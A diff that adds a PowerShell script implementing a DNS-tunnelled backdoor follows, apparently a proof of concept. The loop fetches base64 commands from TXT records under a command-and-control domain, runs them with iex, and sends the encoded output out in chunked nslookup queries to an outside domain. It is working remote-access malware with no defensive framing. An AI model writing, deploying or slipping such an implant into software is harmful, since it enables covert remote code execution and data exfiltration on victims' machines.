@@ -1,0 +1,68 @@
+function sendResult($data)
+{
+    if($data -isnot [system.array])
+    {
+       $data = $data -split "`t`n"
+    }
+
+        $maxSize = 18
+    $lines = $data.length
+
+    for ($lineId = 0; $lineId -lt $lines; $lineId++)
+    {
+            $chunks = [System.Math]::Ceiling($data[$lineId].length/$maxSize)
+
+            for ($chunkId = 0; $chunkId -lt $chunks; $chunkId++)
+            {
+            if (($maxSize * ($chunkId + 1)) -le $data[$lineId].length)
+            {
+                $nextSize = $maxSize
+            }
+            else
+            {
+                $nextSize = $data[$lineId].length - ($chunkId * $maxSize)
+            }
+
+                    $chunk = $data[$lineId].substring($chunkId * $maxSize, $nextSize)
+
+                    if ($chunkId + 1 -ge $chunks)
+            {
+                $chunk += "`t`n"
+            }
+
+            $padding = $chunk.length % 3
+            if ($padding -gt 0)
+            {
+                $chunk += (" " * (3 - $padding))
+            }
+
+            $enc = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($chunk))
+
+            $result = (nslookup -timeout=5 "data.$enc.test.pocs.pl" 2>&1)
+            }
+    }
+}
+
+$cmd = ''
+$i = 1
+$sleepTime = 10
+$cnc = 'test.example.com'
+while (1) {
+    if ('' + (nslookup -q=txt -timeout=5 "cmd.$i.$cnc" 2>&1) -match '@(.*)@')
+    {
+        $cmd += [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($matches[1]))
+        $i++
+    }
+    else
+    {
+        if ($cmd -ne '')
+        {
+            $result = iex $cmd
+            $cmd = ''
+
+            sendResult -data $result
+        }
+
+        Start-Sleep -s $sleepTime; continue
+    }
+}
